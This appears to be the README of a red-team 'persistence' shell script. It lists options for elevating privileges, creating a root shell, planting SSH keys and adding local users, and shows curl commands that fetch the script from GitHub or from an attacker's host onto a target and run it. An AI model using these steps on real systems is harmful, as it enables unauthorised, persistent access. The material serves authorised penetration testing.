# Persistence Phase

Definition Persistence...

With this script it is possible to apply some persistence techniques to get a foothold on a system.

## Features

- Elevate privileges
- Create a root shell
- Modify ssh keys
- Create local user

## Usage

```sh
# From github
curl -LJO https://github.com/McSquizzy/red-team-toolbox/blob/main/persistence/persistence.sh
sh persistence.sh -h
```
```sh
# Local network
# Host:
sh persistence.sh -w
# Target:
curl -LJO <Host>:8000/persistence.sh
sh persistence.sh -h
```

### Parameters

```sh
sh persistence.sh -h

Usage: persistence.sh [options]

Options:
-h                Show this help message
-e <username>     Elevate privileges of the given user
                  Root needed!
-r                Create a root shell
                  Root needed!
-s <ssh pub key>  Trying to add ssh public key to authorized_keys of current user
                  Put the contents of your public key in quotes like: -s "ssh-rsa AAAAB3NcaDkL......"
-u <username>     Add a local account/user
                  Root needed!
-p <password>     Set this password to new user
                  Only useful in combination with -u parameter
                  Root needed!
-w                Serves an local web server for transferring files

Output:
-q                Quiet. No banner and no advisory displayed
```

## Results

The results are printed directly to STDOUT.

## Compatibility

The script uses /bin/sh syntax and is fully POSIX compatible so can run on most unix-based (POSIX/Unix/Linux) systems. 